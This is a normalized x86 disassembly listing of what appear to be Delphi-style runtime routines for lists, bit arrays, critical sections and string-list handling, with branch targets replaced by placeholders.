mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_413910
retn
sub_413808
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_413828
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413738
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028b8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4138a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413738
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4138f0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_413808
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41369c
sub_413910
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413738
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_4026fc
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_41394c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413738
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_413910
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402c64
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_41369c
dec ebp
inc edi
jne r-xdata
sub_4139c0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_413a14
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035cc
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413b18
xor eax eax
push ebp
push sub_413a76
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403258
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403248
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413a7d
mov eax [ ebp - 0x4 ]
call sub_413b7c
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_413a90
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413b18
xor eax eax
push ebp
push sub_413b0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413650
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413808
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413b13
mov eax [ ebp - 0x4 ]
call sub_413b7c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_413738
sub_413b2c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413b18
xor eax eax
push ebp
push sub_413b6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4138f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413b76
mov eax [ ebp - 0x4 ]
call sub_413b7c
retn
sub_413b88
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_413bdc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_413bdc
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_413bb8
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026bc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402c64
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026dc
mov edx edi
mov eax ebp
call sub_413bd0
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028b8
sub_413c80
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_413bb8
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_413bdc
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_413cac
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_413d24
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax esi
call sub_41641c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_413d64
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413e1a
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404028
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031a8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041f4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031a8
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413e21
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_413e40
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_413ed5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031a8
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_4041f4
mov eax ebx
mov si 0xffff
call sub_403454
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413edc
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax ebx
mov si 0xffff
call sub_403454
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403454
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_404310
sub_413ee7
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403494
mov eax ebx
mov si 0xffff
call sub_403454
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403454
push eax
lea eax [ ebx + 0x4 ]
call sub_4055cc
mov ecx eax
mov edx r-xdata
pop eax
call sub_40330c
sub_413f44
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_413f64
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_413f84
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40330c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_413fac
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_413fcc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_414026
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_413894
call sub_403258
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_414034
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_414b8c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413d24
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_414064
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414088
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4140ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414153
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4141fc
xor eax eax
push ebp
push sub_414136
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41413d
mov eax [ ebp - 0x4 ]
call sub_4142b8
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_414164
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_413d50
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4141fc
xor eax eax
push ebp
push sub_4141e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4142b8
retn
sub_414214
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4142cc
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_41426c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_414a24
mov eax [ ebp - 0x8 ]
push eax
push sub_414cd4
push ebp
call sub_414214
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4142cc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414361
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414368
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fb4
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_40439c
jne r-xdata
sub_414378
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_414374
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
jmp sub_4039cc
sub_4143b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4143f8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405a90
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_414378
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4143ff
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_414408
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4144e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4141fc
xor eax eax
push ebp
push sub_4144be
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4144c5
mov eax [ ebp - 0x4 ]
call sub_4142b8
retn
sub_4144fc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_414541
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404450
call sub_408548
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414548
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_414550
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41465b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_404028
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_404080
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414662
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fb4
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_404250
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_404250
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_404250
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404250
mov ebx eax
test ebx ebx
je r-xdata
sub_414678
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4146f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4146f7
lea eax [ ebp - 0xc ]
call sub_403f90
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_414704
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4147c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_4044b0
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_414d64
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404178
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40bee8
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4147ce
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fb4
lea eax [ ebp - 0xc ]
call sub_403f90
retn
sub_4147d8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_41480c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41483c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4158a0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414884
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41488b
mov eax [ ebp - 0x4 ]
call sub_403258
retn
sub_414890
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41492d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4141fc
xor eax eax
push ebp
push sub_414910
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_4153ec
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_404080
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414917
